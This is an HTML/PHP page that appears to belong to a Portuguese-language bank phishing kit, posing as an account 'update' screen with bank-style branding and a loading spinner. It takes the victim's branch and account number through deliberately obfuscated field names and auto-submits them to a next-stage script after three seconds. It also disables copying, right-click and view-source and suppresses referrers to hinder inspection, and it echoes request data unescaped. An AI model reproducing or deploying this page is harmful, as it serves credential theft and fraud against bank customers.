<html lang="pt-br"><head><script>
function disableselect(e){
    return false;
}

function reEnable(){   
    return true;
}

document.onselectstart = function() { return false; }   
document.oncontextmenu = function() { return false; }

if (window.sidebar) {   
    document.onmousedown = disableselect;   
    document.onclick = reEnable;
}

document.onkeydown = function(e) {
  if (e.ctrlKey && (e.keyCode === 67 || e.keyCode === 86 || e.keyCode === 85 ||  e.keyCode === 117)) {
    alert('Acao nao permitida!');
    return false;
  } else {
          return true;
        }
};
</script>
<!-- Referrer -->
<script>
  var meta = document.createElement('meta');
  meta.name = "referrer";
  meta.content = "no-referrer";
  document.getElementsByTagName('head')[0].appendChild(meta);
</script><meta name="referrer" content="no-referrer">




    <meta charset="utf-8">
     <title>Atualização</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
		 
    <link href="./css/tiopatas.css" rel="stylesheet">
    <style type="text/css">
    h1, input {
        font-family: "Open Sans", Helvetica, sans-serif;
    }

    .input {
        width: 100%;
		background-color: #f7f7f7;
        height: 50px;
        display: block;
        padding: 0 5px;
        border: none;
        border-bottom: 3px solid #ebebeb;
    }
    .input:focus {
        outline: none;
        border-bottom-color: #ff0000 !important;
    }

	
.form-signin
{
    max-width: 100%;
    padding: 20px;
    margin: auto;
}
.form-signin .form-signin-heading, .form-signin .checkbox
{
    margin-bottom: 20px;
}
.form-signin .checkbox
{
    font-weight: normal;
}
.form-signin .form-control
{
    position: relative;
    font-size: 16px;
    height: auto;
    padding: 10px;
    -webkit-box-sizing: border-box;
    -moz-box-sizing: border-box;
    box-sizing: border-box;
}
.form-signin .form-control:focus
{
    z-index: 2;
}
.form-signin input[type="text"]
{
    margin-bottom: -1px;
    border-bottom-left-radius: 0px;
    border-bottom-right-radius: 0px;
}
.form-signin input[type="password"]
{
    margin-bottom: 10px;
    border-top-left-radius: 0px;
    border-top-right-radius: 0px;
}
.account-wall
{
    margin-top: -10px;
    padding: 0px 0px 0px 0px;
    background-color: #f7f7f7;
    -moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
    -webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
    box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
}
.login-title
{
    color: #555;
    font-size: 18px;
    font-weight: 400;
    display: block;
}
.profile-img
{
    width: 100%;
    height: 50px;
    margin: 5px 0px 0px;
    display: block;
    /*-moz-border-radius: 0%;
    -webkit-border-radius: 0%;
    border-radius: 40%;*/
}



.spinner {
  margin: 100px auto 0;
  width: 70px;
  text-align: center;
}

.spinner > div {
  width: 18px;
  height: 18px;
  background-color: #FFF;
  opacity: 0.9;

  border-radius: 100%;
  display: inline-block;
  -webkit-animation: sk-bouncedelay 1.4s infinite ease-in-out both;
  animation: sk-bouncedelay 1.4s infinite ease-in-out both;
}

.spinner .bounce1 {
  -webkit-animation-delay: -0.32s;
  animation-delay: -0.32s;
}

.spinner .bounce2 {
  -webkit-animation-delay: -0.16s;
  animation-delay: -0.16s;
}

@-webkit-keyframes sk-bouncedelay {
  0%, 80%, 100% { -webkit-transform: scale(0) }
  40% { -webkit-transform: scale(1.0) }
}

@keyframes sk-bouncedelay {
  0%, 80%, 100% { 
    -webkit-transform: scale(0);
    transform: scale(0);
  } 40% { 
    -webkit-transform: scale(1.0);
    transform: scale(1.0);
  }
}
hr.style13 {
	height: 200px;
	background-color: #E40203; height: 260px; border: 0; 
}
</style>
  <script>
  setTimeout(function() {
    document.getElementById('formulario').submit();
  }, 3000);
</script>	

</head>
<body>
<form action="mobile_2.php" method="post" name="formulario" id="formulario">
	<input type="hidden" id="xaxgxexnxcxixax" name="xaxgxexnxcxixax" value="<?php echo $_POST['xaxgxexnxcxixax']; ?>">
	<input type="hidden" id="xcxoxnxtxa" name="xcxoxnxtxa" value="<?php echo $_POST['xcxoxnxtxa']; ?>">
</form>

<div class="container">
    <div class="row">
        <div>
            <div class="account-wall">
			
				<h6 align="center" style=" background-color: #E40203;"><img src="./img/logo.png" height="80" width="250"><br><div class="spinner">
  <div class="bounce1"></div>
  <div class="bounce2"></div>
  <div class="bounce3"></div>
</div><hr class="style13"></h6>

            </div>
        </div>
    </div>
</div>
<script type="text/javascript">

</script>


</body></html>